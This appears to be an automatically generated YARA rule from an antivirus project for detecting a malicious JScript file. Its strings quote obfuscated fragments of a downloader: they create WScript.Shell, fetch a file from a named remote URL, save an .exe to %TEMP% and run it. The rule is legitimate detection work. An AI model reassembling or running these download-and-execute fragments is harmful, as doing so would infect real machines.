rule sig_20160328_8f843bfce4d30c3fa13c9cf9b329fc99 {
  meta:
    description = "datamaliciousorder - file 20160328_8f843bfce4d30c3fa13c9cf9b329fc99.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "1bdc23217cb8a87bbfa72330e4ddb9dff68629969869e519631ee7f435ffc465"

  strings:
    $s1  = "function Ylbzhdy() {return Rzprawker[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"1SguAcU9DWxyx.exe\";};" fullword ascii
    $s2  = "Zidzgiehx[Jfsebn](\"GET\", \"http://dukeplasticslab.com/j47akfa\", false);" fullword ascii
    $s3  = "do {WScript[Dacwhia](Knrgcibzq() * 11)} while (Zidzgiehx[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Tjsaeiebzj(Axnuavquc, Zyfrnpplmn){return Axnuavquc - Zyfrnpplmn;};" fullword ascii
    $s5  = "var Rzprawker = function Wptwvsy() {return WScript[Xzwlss](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Vfkbbef(Ebpwsvfu){Rzprawker[\"Run\"](Ebpwsvfu, Xjluiq, Xjluiq);};" fullword ascii
    $s7  = "function Iuszpwncco() {return ((Vaxqjxfnu == true) && (Vaxqjxfnu == Pfghoclr)) ? 1 : Xjluiq;};" fullword ascii
    $s8  = "var Zciwlpjkv = false;" fullword ascii
    $s9  = "function Aetstfp(){return Crqyfrbs;};" fullword ascii
    $s10 = "Pfghoclr = true; " fullword ascii
    $s11 = "function Knrgcibzq(){return 22;};" fullword ascii
    $s12 = "function Xzukc(){return Xzwlss;};" fullword ascii
    $s13 = "function Fuodqw(Wxxbqe) {var Btbfzix = (1, 2, 3, 4, 5, Wxxbqe); return Btbfzix;};" fullword ascii
    $s14 = "Vaxqjxfnu = true; " fullword ascii
    $s15 = "var Vaxqjxfnu = false;" fullword ascii
    $s16 = "var Pwspryib = new this[\"Date\"]();" fullword ascii
    $s17 = "return Tjsaeiebzj(Suqbq, Vxpdbfhc);" fullword ascii
    $s18 = "var Pfghoclr = false;" fullword ascii
    $s19 = " while (Jziagn){" fullword ascii
    $s20 = "function Digcagvp()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}